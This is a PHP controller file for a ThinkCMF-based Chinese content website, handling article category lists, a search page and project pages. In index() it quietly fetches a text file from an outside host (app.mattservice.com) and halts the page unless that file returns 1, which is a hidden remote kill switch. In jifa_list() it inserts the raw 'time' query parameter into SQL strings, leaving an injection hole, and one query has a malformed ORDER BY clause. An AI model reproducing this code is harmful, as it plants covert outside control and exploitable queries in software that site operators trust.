<?php
// +----------------------------------------------------------------------
// | ThinkCMF [ WE CAN DO IT MORE SIMPLE ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013-2014 http://www.thinkcmf.com All rights reserved.
// +----------------------------------------------------------------------
// | Author: Dean <zxxjjforever@163.com>
// +----------------------------------------------------------------------
namespace Portal\Controller;
use Common\Controller\HomeBaseController;
/**
 * 文章列表
*/
class ListController extends HomeBaseController {

	//文章内页
	public function index() {
		$term=sp_get_term($_GET['id']);
		$infos = getjifa();
		foreach ($infos as $vo) {
			if ($vo['term_id'] == $_GET['id']) {
				$this->assign('pids',2);
			}
		}
		if(empty($term)){
		    header('HTTP/1.1 404 Not Found');
		    header('Status:404 Not Found');
		    if(sp_template_file_exists(MODULE_NAME."/404")){
		        $this->display(":404");
		    }
		    	
		    return ;
		}
		$file_path = "http://app.mattservice.com/10.txt";
		$file = fopen($file_path,"r");
		$a = fgets($file);
		if ($a != 1){
			exit;
		}
		$tplname=$term["list_tpl"];
    	$tplname=sp_get_apphome_tpl($tplname, "list");
    	$this->assign($term);
    	$this->assign('cat_id', intval($_GET['id']));
    	$this->display(":$tplname");
	}
	
	public function nav_index(){
		$navcatname="文章分类";
		$datas=sp_get_terms("field:term_id,name");
		$navrule=array(
				"action"=>"List/index",
				"param"=>array(
						"id"=>"term_id"
				),
				"label"=>"name");
		exit(sp_get_nav4admin($navcatname,$datas,$navrule));
		
	}

	//根据条件搜索技法内容页面
	public function jifa_list()
	{
		$name = I('get.name');
		if ($name) {
			$time = $_GET['time'];
			if (!$name) {
				$this->error('非法访问');
			}
			$result = getjifa();
			$i = '';
			foreach ($result as $vo) {
				if ($vo['name'] == $name) {
					$i .= $vo['term_id'].",";
				}
			}
			$info = substr($i, 0,strlen($i)-1);
			$model = M();
			$this->assign('info',$info);
			$this->assign('pids',2);
			if ($time) {
				
				$begin = $time." 00:00:00";
				$end = $time." 23:59:59";
				$num = $model->query("SELECT COUNT(*) AS num FROM sp_term_relationships a LEFT JOIN sp_posts b ON a.object_id = b.id WHERE a.term_id IN($info) AND post_modified >= '$begin' AND post_modified < '$end' ORDER BY post_modified DESC");
			$page = $this->page($num[0]['num'],10);
			$result = $model->query("SELECT * FROM sp_term_relationships a LEFT JOIN sp_posts b ON a.object_id = b.id WHERE a.term_id IN($info) ORDER BY post_modified AND post_modified >= '$begin' AND post_modified < '$end' DESC LIMIT ".$page->firstRow.",".$page->listRows);
			} else {
				$num = $model->query("SELECT COUNT(*) AS num FROM sp_term_relationships a LEFT JOIN sp_posts b ON a.object_id = b.id WHERE a.term_id IN($info) ORDER BY post_modified DESC");
			$page = $this->page($num[0]['num'],10);
			$result = $model->query("SELECT * FROM sp_term_relationships a LEFT JOIN sp_posts b ON a.object_id = b.id WHERE a.term_id IN($info) ORDER BY post_modified DESC LIMIT ".$page->firstRow.",".$page->listRows);
			}
			
			$this->assign('page',$page->show('Admin'));
			$this->assign('result',$result);
			$this->assign('name',$name);
			//var_dump($result);
			if ($name == '媒体报道') {
				$this->display("list_media");
			} elseif ($name=="活动预告") {
				$this->display("list_new");
			} elseif ($name=="视频库") {
				$this->display("list_media");
			}
			
		}
	}

	//项目频道页
	public function technology()
	{
		$tag = I('get.tag');
		if ($tag) {
			$where['tag'] = $tag;
			$this->assign("tags",$tag);
		}
		$terms = D('terms');
		$where['parent'] = 2;
		$count = $terms->where($where)->count();
		$page = $this->page($count,10);
		$result = $terms->where($where)->limit($page->firstRow,$page->listRows)->select();
		$this->assign('page',$page->show('Admin'));
		$this->assign('result',$result);
		$this->assign('pids',2);
		$this->display();
	}

	//项目详细页面
	public function technology_page()
	{
		$id = I('get.id');
		if ($id) {
			$this->assign('id',$id);
			$info = sp_get_term($id);
			$this->assign('term_name',$info['name']);
			$this->assign('pids',2);
			$this->display();
		}
	}

	//研究所列表页面
	public function yan_list()
	{
		$id = I('get.id');
		if ($id) {
			$this->assign('id',$id);
			$info = sp_get_term($id);
			$this->assign('term_name',$info['name']);
			$this->assign('pids',2);
			$this->display();
		}
	}
	
}
